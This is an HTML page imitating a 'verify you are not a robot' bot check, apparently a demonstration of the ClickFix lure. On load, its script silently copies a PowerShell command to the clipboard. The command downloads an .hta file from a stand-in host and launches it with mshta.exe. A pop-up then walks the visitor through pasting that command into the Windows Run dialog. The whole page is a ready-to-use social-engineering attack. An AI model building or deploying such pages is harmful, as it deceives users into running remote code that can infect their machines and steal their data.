<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify</title>
  <script>
    document.addEventListener("DOMContentLoaded", async () => {
    const textToCopy = "powershell -c iwr https://example.com/badfile.hta -Outfile $env:userprofile\\s.hta; Start-Process -FilePath \"mshta.exe\" -ArgumentList \"\$env:userprofile\\s.hta\"";


    try {
      await navigator.clipboard.writeText(textToCopy);
      console.log("Text successfully copied to clipboard!");
    } catch (err) {
      console.error("Failed to copy text automatically:", err);
    }
  });
  </script>
  <style>
    html {
      line-height: 1.15;
      -webkit-text-size-adjust: 100%;
      color: #313131;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      /* Background Image */
      background-image: url('https://greetjerry098-web.github.io/Cloudflare-Bot-Challenge-example/background.png');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
    }

    /* Solid Black Popup Container */
    dialog {
      border: none; /* Removed the outline/border */
      outline: none; /* Prevents default browser focus outline */
      border-radius: 12px;
      padding: 24px;
      max-width: 400px;
      width: 90%;
      background-color: #1f1e1e; /* Pure Black Background */
      color: #ffffff;            /* White Text */
      /* Added shadow */
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 15px rgba(0, 0, 0, 0.5);
    }

    /* Grays out / dims the background image behind the popup */
    dialog::backdrop {
      background: rgba(0, 0, 0, 0.75);
      backdrop-filter: blur(2px);
    }

    .modal-content {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    h2 {
      margin: 0;
      color: #ffffff;
    }

    .popup-text {
      font-size: 1rem;
      line-height: 1.5;
      color: #cccccc;
      margin: 0;
    }

    .popup-image {
      width: 100%;
      height: 200px;
      border-radius: 8px;
      object-fit: cover;
    }

    .modal-actions {
      display: flex;
      justify-content: flex-end;
      margin-top: 10px;
    }

    button {
      background-color: #ffffff;
      color: #000000;
      border: none;
      padding: 10px 20px;
      font-size: 0.95rem;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
    }

    button:hover {
      background-color: #dddddd;
    }
  </style>
</head>
<body>

  
  <dialog id="popupModal">
    <div class="modal-content">
      <h2>Extra Verification needed</h2>
      
      <p class="popup-text">
        1. Press Windows+R to open the run dialog
      </p>
      <p class="popup-text">
        2. Click Allow ⬆️
      </p>
      <p class="popup-text">
        3. Press Ctrl+V
      </p>
      <p class="popup-text">
        4. Press Ok to verify your not a robot.
      </p>
    </div>
  </dialog>

  <script>
    const modal = document.getElementById('popupModal');
    const closeModalBtn = document.getElementById('closeModalBtn');

    // Auto-open popup on load
    document.addEventListener('DOMContentLoaded', () => {
      if (modal && typeof modal.showModal === 'function') {
        modal.showModal();
      }
    });

    if (closeModalBtn) {
      closeModalBtn.addEventListener('click', () => {
        modal.close();
      });
    }
  </script>

</body>
</html>
